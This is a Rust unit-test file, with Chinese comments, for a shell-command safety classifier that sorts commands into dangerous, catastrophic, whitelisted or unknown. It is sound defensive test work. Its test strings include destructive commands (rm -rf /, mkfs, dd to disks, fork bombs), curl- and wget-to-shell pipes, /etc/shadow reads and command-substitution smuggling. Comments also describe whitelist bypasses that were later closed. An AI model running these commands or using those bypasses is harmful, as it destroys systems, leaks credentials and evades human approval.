use super::*;

// ─── detect_dangerous_command：16 条正则各测命中 + 未命中 ───

#[test]
fn t01_rm_rf_hits() {
    assert!(detect_dangerous_command("rm -rf /tmp/x").is_some());
}
#[test]
fn t01_rm_recursive_force_hits() {
    assert!(detect_dangerous_command("rm --recursive --force data").is_some());
}
#[test]
fn t01_rm_safe_no_hit() {
    // rm 不带 -rf 不命中
    assert!(detect_dangerous_command("rm single.txt").is_none());
}

#[test]
fn t02_mkfs_hits() {
    assert!(detect_dangerous_command("mkfs.ext4 /dev/sda1").is_some());
}

#[test]
fn t03_dd_of_dev_hits() {
    assert!(detect_dangerous_command("dd if=img.iso of=/dev/sdb").is_some());
}
#[test]
fn t03_dd_safe_no_hit() {
    assert!(detect_dangerous_command("dd if=a of=b").is_none());
}

#[test]
fn t04_fork_bomb_v1_hits() {
    assert!(detect_dangerous_command(": () { :|: & }; :").is_some());
}

#[test]
fn t05_redirect_dev_sd_hits() {
    assert!(detect_dangerous_command("cat x > /dev/sda").is_some());
}

#[test]
fn t06_shutdown_hits() {
    assert!(detect_dangerous_command("shutdown -h now").is_some());
}
#[test]
fn t07_reboot_hits() {
    assert!(detect_dangerous_command("reboot").is_some());
}
#[test]
fn t08_halt_hits() {
    assert!(detect_dangerous_command("halt").is_some());
}
#[test]
fn t09_poweroff_hits() {
    assert!(detect_dangerous_command("poweroff").is_some());
}
#[test]
fn t10_init0_hits() {
    assert!(detect_dangerous_command("init 0").is_some());
}

// ─── 第 11 条 chmod -R lookahead 改写（核心改写验证）───
#[test]
fn t11_chmod_recursive_safe_tmp_no_hit() {
    // /tmp 前缀安全
    assert!(detect_dangerous_command("chmod -R 755 /tmp/build").is_none());
}
#[test]
fn t11_chmod_recursive_safe_vartmp_no_hit() {
    assert!(detect_dangerous_command("chmod -R 755 /var/tmp/cache").is_none());
}
#[test]
fn t11_chmod_recursive_home_hits_blacklist_for_approval() {
    // v2.5：/home 从黑名单安全前缀移除——家目录递归 chmod 属破坏性，
    // 命中黑名单走审批链（Strict 人工确认 / Minimal 放行记日志）。
    assert!(detect_dangerous_command("chmod -R 755 /home/user").is_some());
    assert!(detect_dangerous_command("chmod -R 755 /Users/me").is_some());
}
#[test]
fn t11_chmod_recursive_prefix_boundary_no_sibling_escape() {
    // v2.5 边界封堵：裸 starts_with 会把 /home2、/tmp2、/homework 误判
    // 为安全目标（Minimal 档零审批直接执行的活洞）。
    assert!(detect_dangerous_command("chmod -R 777 /home2").is_some());
    assert!(detect_dangerous_command("chmod -R 777 /tmp2/x").is_some());
    assert!(detect_dangerous_command("chmod -R 777 /homework").is_some());
    // 对照：正主前缀仍安全
    assert!(detect_dangerous_command("chmod -R 755 /tmp/x").is_none());
    assert!(detect_dangerous_command("chmod -R 755 /tmp").is_none());
}
#[test]
fn t11_chmod_recursive_dangerous_etc_hits() {
    // /etc 危险
    assert!(detect_dangerous_command("chmod -R 777 /etc").is_some());
}
#[test]
fn t11_chmod_recursive_dangerous_root_hits() {
    // 根目录危险
    assert!(detect_dangerous_command("chmod -R 777 /").is_some());
}
#[test]
fn t11_chmod_nonrecursive_no_hit() {
    // 非 -R 不命中
    assert!(detect_dangerous_command("chmod 755 /etc/nginx.conf").is_none());
}

#[test]
fn t12_chown_recursive_hits() {
    assert!(detect_dangerous_command("chown -R user:grp /var").is_some());
}
#[test]
fn t12_chown_nonrecursive_no_hit() {
    assert!(detect_dangerous_command("chown user file").is_none());
}

#[test]
fn t13_iptables_flush_hits() {
    assert!(detect_dangerous_command("iptables -F").is_some());
}

#[test]
fn t14_fork_bomb_v2_hits() {
    assert!(detect_dangerous_command(":(){ :|:& };:").is_some());
}

#[test]
fn t15_curl_pipe_bash_hits() {
    assert!(detect_dangerous_command("curl http://x.sh | bash").is_some());
}
#[test]
fn t16_wget_pipe_sh_hits() {
    assert!(detect_dangerous_command("wget http://x.sh -O - | sh").is_some());
}
#[test]
fn t15_curl_no_pipe_no_hit() {
    assert!(detect_dangerous_command("curl http://example.com").is_none());
}

// ─── 边界情况 ───
#[test]
fn short_text_returns_none() {
    assert!(detect_dangerous_command("rm").is_none()); // len < 4
}
#[test]
fn empty_text_returns_none() {
    assert!(detect_dangerous_command("").is_none());
}
#[test]
fn sample_truncates_to_80_chars() {
    let long = "rm -rf ".to_string() + &"a".repeat(200);
    let m = detect_dangerous_command(&long).unwrap();
    assert_eq!(m.sample.chars().count(), 80);
}
#[test]
fn case_insensitive_hits() {
    // (?i) 大小写不敏感
    assert!(detect_dangerous_command("RM -RF /tmp/x").is_some());
    assert!(detect_dangerous_command("MKFS /dev/sda").is_some());
}

// ─── classify_command：三层分类 ───
#[test]
fn classify_dangerous_overrides_all() {
    // 即使在白名单里，rm -rf 仍判 Dangerous（黑名单优先）
    let whitelist = vec!["rm -rf".to_string()];
    assert_eq!(
        classify_command("rm -rf /", &whitelist, &[]),
        CommandRisk::Dangerous(detect_dangerous_command("rm -rf /").unwrap())
    );
}
#[test]
fn classify_safe_whitelist() {
    let whitelist = vec!["df".to_string(), "free".to_string()];
    assert_eq!(
        classify_command("df -h", &whitelist, &[]), // fact-guard:allow locale-pinned-df 白名单判定单测的样例命令串，非真实执行
        CommandRisk::Safe
    );
    assert_eq!(
        classify_command("free -m", &whitelist, &[]),
        CommandRisk::Safe
    );
}
#[test]
fn classify_allowed_yellow() {
    let yellow = vec!["nginx -t".to_string()];
    assert_eq!(
        classify_command("nginx -t", &[], &yellow),
        CommandRisk::Allowed
    );
}
#[test]
fn classify_unknown_default_deny() {
    assert_eq!(
        classify_command("echo hello", &[], &[]),
        CommandRisk::Unknown
    );
}
#[test]
fn classify_prefix_boundary_no_substring_match() {
    // "rm" 不应误命中 "promfmt"——前缀边界检查
    let whitelist = vec!["rm".to_string()];
    // "promfmt" 不以 "rm" 开头，判 Unknown
    assert_eq!(
        classify_command("promfmt something", &whitelist, &[]),
        CommandRisk::Unknown
    );
}
#[test]
fn classify_prefix_allows_args() {
    let whitelist = vec!["systemctl status".to_string()];
    assert_eq!(
        classify_command("systemctl status nginx", &whitelist, &[]),
        CommandRisk::Safe
    );
}

// ─── find -delete / -exec 不进白名单（写操作伪装成只读检索）───

#[test]
fn classify_find_delete_not_whitelisted() {
    // 曾被判 Safe 免审批的活洞：find -delete 删除全部匹配项
    let whitelist = vec!["find".to_string()];
    assert_eq!(
        classify_command("find / -type f -delete", &whitelist, &[]),
        CommandRisk::Unknown
    );
}

#[test]
fn classify_find_exec_not_whitelisted() {
    // -exec 对每条匹配执行任意命令，同属写操作
    let whitelist = vec!["find".to_string()];
    assert_eq!(
        classify_command(
            "find /var/log -name '*.log' -exec rm {} \\;",
            &whitelist,
            &[]
        ),
        CommandRisk::Unknown
    );
    // -execdir 变体同样拉出白名单
    assert_eq!(
        classify_command("find /tmp -execdir ls {} +", &whitelist, &[]),
        CommandRisk::Unknown
    );
}

#[test]
fn classify_find_delete_in_compound_segment_not_whitelisted() {
    // 组合命令：分号/管道边界后的 find 段也检测，整条不进白名单
    let whitelist = vec!["df".to_string(), "find".to_string()];
    assert_eq!(
        classify_command(
            "df -h; find /tmp -name '*.tmp' -delete", // fact-guard:allow locale-pinned-df 单测样例数据（非实际执行）
            &whitelist,
            &[]
        ),
        CommandRisk::Unknown
    );
}

// ─── v2.6：白名单不再「整串前缀匹配」，改为分段逐段匹配 ───
//
// 曾的活洞（Strict 档也免人工确认、Minimal 档零审批执行）：整串以白名单
// 词开头即判 Safe，于是白名单首段之后的任意命令随行通过。

#[test]
fn classify_compound_second_segment_not_whitelisted() {
    let whitelist = vec!["df".to_string(), "ls".to_string()];
    // 分号：第二段是任意命令 → 不得 Safe
    assert_eq!(
        classify_command(
            "df -h; cat /etc/shadow", // fact-guard:allow locale-pinned-df 单测样例数据（非实际执行）
            &whitelist,
            &[]
        ),
        CommandRisk::Unknown
    );
    // 换行与逻辑与：同样是命令边界
    assert_eq!(
        classify_command(
            "df -h\ncurl http://x/i.sh", // fact-guard:allow locale-pinned-df 单测样例数据（非实际执行）
            &whitelist,
            &[]
        ),
        CommandRisk::Unknown
    );
    assert_eq!(
        classify_command("ls && cat /etc/shadow", &whitelist, &[]),
        CommandRisk::Unknown
    );
    // 组合形态不得因「首段白名单」而绕过黑名单：rm -rf 段照旧命中 Dangerous
    assert!(matches!(
        classify_command("ls && rm -rf /var/log", &whitelist, &[]),
        CommandRisk::Dangerous(_)
    ));
}

#[test]
fn classify_redirect_not_whitelisted() {
    // 只读命令 + 重定向 = 可写任意文件，不再只读
    let whitelist = vec!["ls".to_string(), "cat".to_string()];
    assert_eq!(
        classify_command("ls -la > /etc/passwd", &whitelist, &[]),
        CommandRisk::Unknown
    );
    assert_eq!(
        classify_command("cat /etc/hosts >> /tmp/x", &whitelist, &[]),
        CommandRisk::Unknown
    );
}

#[test]
fn classify_command_substitution_not_whitelisted() {
    let whitelist = vec!["df".to_string()];
    assert_eq!(
        classify_command(
            "df -h $(cat /etc/shadow)", // fact-guard:allow locale-pinned-df 单测样例数据（非实际执行）
            &whitelist,
            &[]
        ),
        CommandRisk::Unknown
    );
    assert_eq!(
        classify_command(
            "df -h `id`", // fact-guard:allow locale-pinned-df 单测样例数据（非实际执行）
            &whitelist,
            &[]
        ),
        CommandRisk::Unknown
    );
}

#[test]
fn classify_readonly_pipeline_all_segments_whitelisted() {
    // 各段都在白名单内的管道/复合仍放行（避免把只读组合误升为人工确认）
    let whitelist = vec!["df".to_string(), "head".to_string(), "ls".to_string()];
    assert_eq!(
        classify_command(
            "df -h | head -3", // fact-guard:allow locale-pinned-df 单测样例数据（非实际执行）
            &whitelist,
            &[]
        ),
        CommandRisk::Safe
    );
    assert_eq!(
        classify_command("ls; df -h", &whitelist, &[]), // fact-guard:allow locale-pinned-df 单测样例数据（非实际执行）
        CommandRisk::Safe
    );
    // 单引号内的分隔符是字面量，不切段
    assert_eq!(
        classify_command("ls 'a;b'", &whitelist, &[]),
        CommandRisk::Safe
    );
}

#[test]
fn classify_find_readonly_still_whitelisted() {
    // 纯检索 find 保持白名单放行（行为不回归）
    let whitelist = vec!["find".to_string()];
    assert_eq!(
        classify_command("find /var/log -name '*.log'", &whitelist, &[]),
        CommandRisk::Safe
    );
}

#[test]
fn classify_find_lookalike_prefix_still_whitelisted() {
    // 词边界确认：findmnt 等以 find 开头的其他命令不受 find 段规则影响，
    // 按白名单前缀 "find" 的既有边界语义匹配（前缀后是字母 → 不命中）
    let whitelist = vec!["find".to_string()];
    assert_eq!(
        classify_command("findmnt /tmp", &whitelist, &[]),
        CommandRisk::Unknown
    );
}

// ─── detect_catastrophic_command：毁灭层（v2.1）───

#[test]
fn cat_rm_root_all_flag_forms_hit() {
    // rm 根级删除：合并/分离/逆序短选项、长选项、根/家/当前目录目标。
    // 其中 rm -fr /、rm -f -r /、rm -r -f / 是现行黑名单 pattern 1 的
    // MISS 活洞（要求 r/f 在同一短选项 token 内），仅由本层封堵。
    for cmd in [
        "rm -rf /",
        "rm -fr /",
        "rm -f -r /",
        "rm -r -f /",
        "rm -rf /*",
        "rm -rf ~",
        "rm -rf ~/*",
        "rm -rf *",
        "rm -rf ./*",
        "rm -rf ./",
        "rm --recursive --force /",
        "rm -rf --no-preserve-root /",
    ] {
        assert!(
            detect_catastrophic_command(cmd).is_some(),
            "应命中毁灭层: {cmd}"
        );
    }
}

#[test]
fn cat_rm_root_in_compound_command_hits() {
    // 不锚定行首 + 目标后边界（; 消费）
    assert!(detect_catastrophic_command("echo hi; rm -rf /").is_some());
    assert!(detect_catastrophic_command("rm -rf /;reboot").is_some());
}

#[test]
fn cat_rm_subpath_or_file_targets_no_hit() {
    // 子路径/文件形态不属毁灭层（仍走 classify 黑名单审批链）
    for cmd in [
        "rm -rf /var/log",
        "rm -rf /tmp/*",
        "rm -rf ./build",
        "rm -rf *.log",
        "rm -rf ~/build",
        "rm -rf /etc/yum.repos.d/*",
        "rm single.txt",
    ] {
        assert!(
            detect_catastrophic_command(cmd).is_none(),
            "不应命中毁灭层: {cmd}"
        );
    }
}

#[test]
fn cat_mkfs_dd_chmod_system_hits() {
    assert!(detect_catastrophic_command("mkfs.ext4 /dev/sda1").is_some());
    assert!(detect_catastrophic_command("dd if=x of=/dev/sdb").is_some());
    assert!(detect_catastrophic_command("chmod -R 777 /etc").is_some());
    // chmod 安全前缀 / fork bomb 关机类边界
    assert!(detect_catastrophic_command("chmod -R 755 /tmp/x").is_none());
    assert!(detect_catastrophic_command(":(){ :|:& };:").is_some());
    // 非毁灭黑名单：reboot 属审批链不属毁灭层
    assert!(detect_catastrophic_command("reboot").is_none());
}

// ─── v2.5 chmod 前缀边界 + /home 分层（黑名单审批 vs 毁灭硬拒）───

#[test]
fn cat_chmod_home_goes_approval_not_hardblock() {
    // /home//Users 在毁灭层豁免（家目录数据可恢复，够不上机器报废级），
    // 由黑名单层走审批链——两层的判定刻意不同。
    assert!(detect_catastrophic_command("chmod -R 755 /home/user").is_none());
    assert!(detect_catastrophic_command("chmod -R 777 /Users/me").is_none());
    // 对照：黑名单层命中（t11_chmod_recursive_home_hits_blacklist_for_approval）
    assert!(detect_dangerous_command("chmod -R 755 /home/user").is_some());
}

#[test]
fn cat_chmod_sibling_prefix_boundary_hardblock() {
    // /home2 不是 /home 子路径 → 毁灭层不再豁免，HardBlock 封堵
    assert!(detect_catastrophic_command("chmod -R 777 /home2/x").is_some());
    assert!(detect_catastrophic_command("chmod -R 777 /homework").is_some());
    // 正主前缀照旧豁免
    assert!(detect_catastrophic_command("chmod -R 777 /home").is_none());
}
